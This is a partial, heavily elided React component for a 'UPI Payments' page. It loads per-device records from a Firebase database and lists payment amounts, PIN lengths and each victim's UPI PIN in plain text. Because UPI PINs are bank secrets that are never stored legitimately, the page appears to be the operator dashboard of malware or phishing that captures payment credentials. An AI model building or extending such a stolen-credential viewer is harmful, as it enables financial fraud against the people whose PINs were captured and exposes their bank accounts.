...
function UPIPaymentsPage() {
  ...
  const fetchData = async () => {
    ...
    setError(null);
    try {
      // ✅ FIXED: "upi_payment" (singular) - CORRECT PATH
      const upiRef = ref(db, `upi_payments/${deviceId}`);
  ...
  if (loading) {
    return (
      <div style={{ 
        ...
        <p style={{ fontSize: '12px', color: 'var(--text-muted)' }}>Loading UPI...</p>
        <style>{`
          @keyframes spin {
  ...
  if (error) {
    return (
      <div style={{ textAlign: 'center', padding: '20px', color: 'var(--text-muted)' }}>
        ...
        <p style={{ fontSize: '13px' }}>Failed to load UPI data</p>
  ...
  if (!data) {
    return (
      <div style={{ textAlign: 'center', padding: '20px', color: 'var(--text-muted)' }}>
        <span style={{ fontSize: '32px', display: 'block', marginBottom: '4px' }}>📭</span>
        <p style={{ fontSize: '13px' }}>No UPI payment data found</p>
      </div>
    );
  }
    ...
    <div style={{ padding: '4px 0' }}>
      ...
      <div style={{ 
        ...
        <div style={{ 
          ...
          <span style={{ fontSize: '11px', color: 'var(--text-muted)', fontWeight: 500 }}>💰 Amount</span>
        ...
        <div style={{ 
          ...
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>🔑 UPI PIN</span>
        ...
        <div style={{ 
          ...
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>📏 PIN Type</span>
          <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
            {data.pinType || data.pinLength ? `${data.pinLength || ''}-digit` : 'N/A'}
          </span>
        </div>
        ...
        <div style={{ 
          ...
          {allPayments.map((payment, index) => (
            <div key={payment.id || index} style={{ 
              ...
              alignItems: 'center', 
              padding: '5px 10px', 
              borderBottom: index < allPayments.length - 1 ? '1px solid var(--border-color)' : 'none'
            }}>
              ...
              <div style={{ textAlign: 'right' }}>
                <span style={{ fontSize: '10px', fontWeight: 500, color: 'var(--text-muted)', fontFamily: 'monospace' }}>
                  PIN: {payment.upiPin || 'N/A'}
                </span>
